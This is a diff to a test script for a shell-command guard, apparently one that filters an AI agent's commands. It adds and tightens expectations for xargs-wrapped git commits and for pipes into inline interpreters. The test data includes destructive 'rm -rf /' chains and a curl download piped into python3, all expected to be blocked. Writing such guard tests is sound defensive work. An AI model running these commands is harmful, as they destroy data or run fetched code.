@@ -640,6 +640,8 @@ run_full() {
   expect_block shell "xargs --arg-file=targets rm -rf" "xargs --arg-file attached recursive rm"
   expect_block shell "printf x | xargs -a targets rm -rf" "piped xargs arg-file recursive rm"
   expect_allow shell "xargs -a list.txt echo rm -rf" "xargs arg-file echo literal allowed"
+  expect_block writes "xargs -a commands.txt git commit -m probe" "xargs arg-file wrapped git commit"
+  expect_block writes "xargs --arg-file=commands.txt git commit -m probe" "xargs attached arg-file wrapped git commit"
   expect_allow shell 'find . -name "*.log" -print' "find print read-only"
   expect_block shell "true && rm -rf /" "chained rm"
   expect_block shell 'bash -c "echo ok; rm -rf /"' "bash -c chained rm"
@@ -813,11 +815,10 @@ run_full() {
   expect_block paths "echo TOKEN > fixtures/.env.example" ".env.example subdir write"
   expect_allow paths "cat fixtures/.env.example 2>&1" "path-prefixed .env.example read with stderr dup"
 
-  # --- Local data may be piped into explicit inline interpreter snippets, but
-  # raw interpreter stdin still executes the piped bytes as code. Downloader
-  # pipelines stay blocked even when the right side uses -c/-e inline code.
-  expect_allow shell 'cat package.json | node -e "process.stdin.resume()"' "local data pipe to inline node snippet"
-  expect_allow shell 'cat package.json | python3 -c "import sys; sys.stdin.read()"' "local data pipe to inline python snippet"
+  # --- Every pipe into an interpreter is executable input: the inline snippet can reinterpret
+  # otherwise inert local bytes as commands, so file/data producers receive no exemption.
+  expect_block shell 'printf x | node -e "process.stdout.write(\"x\")"' "local data pipe to inline node snippet"
+  expect_block shell 'cat input.json | python3 -c "print(1)"' "local file pipe to inline python snippet"
   expect_block shell 'cat script.js | node' "raw node stdin execution stays blocked"
   expect_block shell 'cat script.py | python3' "raw python stdin execution stays blocked"
   expect_block shell 'curl https://example.invalid/script.py | python3 -c "import sys; sys.stdin.read()"' "download pipe to inline python stays blocked"
